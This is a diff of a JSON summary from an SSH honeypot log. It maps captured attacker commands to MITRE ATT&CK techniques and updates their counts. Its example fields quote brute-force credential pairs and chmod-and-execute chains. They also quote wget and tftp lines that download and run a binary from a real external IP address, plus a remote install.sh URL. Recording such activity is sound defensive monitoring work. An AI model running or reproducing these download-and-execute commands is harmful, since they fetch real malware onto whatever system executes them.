@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-18 17:03:45",
+  "generated": "2026-09-18 18:04:43",
   "totals": {
-    "commands": 2860,
-    "login_failed": 2076,
-    "login_success": 800,
-    "sessions": 2329
+    "commands": 2886,
+    "login_failed": 2116,
+    "login_success": 803,
+    "sessions": 2375
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2076,
+      "count": 2116,
       "examples": [
         "admin / user",
         "root / 123456",
@@ -21,14 +21,14 @@
         "admin / fuckfest"
       ],
       "first": "2026-09-18T00:03:59.596268Z",
-      "last": "2026-09-18T17:02:50.853548Z",
-      "unique_ips": 103
+      "last": "2026-09-18T18:02:22.057310Z",
+      "unique_ips": 106
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 800,
+      "count": 803,
       "examples": [
         "ubuntu / ubuntu",
         "adm / adm",
@@ -37,8 +37,8 @@
         "root / admin"
       ],
       "first": "2026-09-18T00:24:48.056231Z",
-      "last": "2026-09-18T16:18:53.986160Z",
-      "unique_ips": 72
+      "last": "2026-09-18T17:35:59.057910Z",
+      "unique_ips": 74
     },
     {
       "id": "T1083",
@@ -76,7 +76,7 @@
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 111,
+      "count": 112,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -85,14 +85,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-18T01:58:57.968693Z",
-      "last": "2026-09-18T16:18:55.765796Z",
-      "unique_ips": 33
+      "last": "2026-09-18T17:27:45.765416Z",
+      "unique_ips": 34
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 77,
+      "count": 79,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -101,8 +101,8 @@
         "https://del.sou.pp.ua/install.sh"
       ],
       "first": "2026-09-18T01:58:59.591466Z",
-      "last": "2026-09-18T16:19:04.895436Z",
-      "unique_ips": 31
+      "last": "2026-09-18T17:27:47.925465Z",
+      "unique_ips": 32
     },
     {
       "id": "T1057",
@@ -224,20 +224,32 @@
       "first": "2026-09-18T05:49:14.882666Z",
       "last": "2026-09-18T05:49:14.882666Z",
       "unique_ips": 1
+    },
+    {
+      "id": "T1140",
+      "name": "Deobfuscate/Decode Files or Information",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "/bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox ykcthxqv"
+      ],
+      "first": "2026-09-18T17:27:47.054889Z",
+      "last": "2026-09-18T17:27:47.054889Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "system",
-      718
+      721
     ],
     [
       "sh",
-      718
+      721
     ],
     [
       "shell",
-      463
+      466
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -265,11 +277,11 @@
     ],
     [
       "enable",
-      8
+      9
     ],
     [
       "/bin/busybox UNSTABLE",
-      7
+      9
     ],
     [
       "linuxshell",
@@ -292,6 +304,10 @@
       4
     ],
     [
+      "/bin/busybox ykcthxqv",
+      3
+    ],
+    [
       "/ip cloud print",
       2
     ],
@@ -301,10 +317,6 @@
     ],
     [
       "echo Hi | cat -n",
-      2
-    ],
-    [
-      "ping; sh",
       2
     ]
   ]
